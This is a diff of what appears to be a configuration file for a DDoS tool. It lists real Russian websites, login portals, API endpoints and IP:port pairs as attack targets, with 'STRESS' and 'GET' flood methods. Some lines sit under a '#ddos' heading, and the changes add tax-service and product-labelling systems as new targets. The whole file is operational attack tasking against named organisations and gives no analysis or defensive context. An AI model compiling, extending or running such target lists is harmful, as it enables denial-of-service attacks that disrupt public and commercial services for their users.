@@ -1,18 +1,16 @@
 #zhnec
 
-https://leroymerlin.ru https://auth.leroymerlin.ru https://import.leroymerlin.ru https://adfs.leroymerlin.ru https://wfm.leroymerlin.ru --http-methods GET STRESS
+https://lkdr.nalog.gov.ru/ https://nalog.gov.ru/ tcp://213.24.64.138:443 tcp://213.24.64.104:443 tcp://81.176.235.2:443 --http-methods STRESS
+https://spravka-nalog.ru https://viza.spravka-nalog.ru tcp://213.24.64.94:443 tcp://87.242.70.127:443 tcp://90.156.242.130:443 --http-methods STRESS
 
 
 #gaidamaky
-tcp://89.208.82.209:21 tcp://89.208.82.209:22 tcp://89.208.82.209:25 http://89.208.82.209 https://89.208.82.209 --http-methods GET 
+tcp://89.208.82.209:21 tcp://89.208.82.209:22 tcp://89.208.82.209:25 http://89.208.82.209 https://89.208.82.209 --http-methods GET
 tcp://89.208.82.196:21 tcp://89.208.82.196:22 tcp://89.208.82.196:25 http://89.208.82.206 https://89.208.82.206 --http-methods GET
 http://89.208.82.196 tcp://89.208.82.195:22 tcp://89.208.82.195:25 tcp://89.208.82.206:21 tcp://89.208.82.206:22 --http-methods GET
-http://www.gravitel.ru https://www.gravitel.ru http://gravitel.omnidesk.ru http://aloha.ru --http-methods GET STRESS
+http://www.gravitel.ru https://www.gravitel.ru http://aloha.ru --http-methods GET STRESS
 
 #ddos separiv
-https://www.aktorstc.ru http://ooo-extruzia.ru/order https://mikron.ru --http-methods GET STRESS
-https://www.gamma.spb.ru https://mail1.gamma.spb.ru https://e-components.ru --http-methods GET STRESS
-https://mail.sp.ru https://micel.ru https://www.chipdip.ru --http-methods GET STRESS
-https://micro-bond.com/moskva/ https://www.protehnology.ru https://www.micro-electronics.ru --http-methods GET STRESS
-https://electron1ca.ru https://elektronika.store https://www.wite.ru --http-methods GET STRESS
-https://www.landcom.ru https://re-store.ru/apple-iphone https://apple-store.net.ru/apple-iphone/ --http-methods GET STRESS
+https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru --http-methods GET STRESS
+https://suzgrid.crpt.ru/login http://api.mdlp.crpt.ru http://kb.crpt.ru https://support.crpt.ru/Login/SspLogin.aspx?ReturnUrl=%2F --http-methods GET STRESS
+http://nrz.api.sb.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru https://честныйзнак.рф/potrebitelyam/ tcp://82.202.190.166:443 --http-methods GET STRESS
